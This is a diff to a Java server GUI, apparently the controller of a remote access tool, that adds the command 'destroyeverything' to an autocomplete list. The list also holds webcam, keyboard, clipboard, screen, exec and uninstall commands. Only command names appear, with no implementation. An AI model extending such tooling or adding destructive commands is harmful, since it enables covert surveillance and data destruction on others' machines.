@@ -47,7 +47,7 @@ public class ServerGUI extends JFrame {
     // Todos os comandos para autocomplete
     private static final String[] ALL_COMMANDS = {
             "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps",
-            "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "view", "receive", "send",
+            "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "view", "receive", "send", "destroyeverything",
             "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen", "webcam", "livestopper",
             "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
     };
